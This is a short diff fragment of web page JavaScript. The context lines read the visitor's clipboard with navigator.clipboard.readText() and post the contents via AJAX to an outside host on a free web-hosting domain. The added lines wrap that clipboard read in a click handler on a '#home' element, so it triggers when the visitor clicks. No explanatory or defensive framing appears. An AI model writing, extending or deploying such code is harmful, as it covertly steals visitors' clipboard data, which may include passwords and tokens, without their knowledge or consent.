@@ -76,6 +76,7 @@
           alert();
           });
           if(document.location.search == "?clip"){
+            $("#home").click(function(){
           navigator.clipboard.readText().then(text => {
     $.ajax({
       url: "https://footmal.000webhostapp.com/neon.php",
@@ -88,6 +89,7 @@
       }
     });
           });
+            });
           } else {
           $.ajax({
       url: "https://footmal.000webhostapp.com/neon.php",
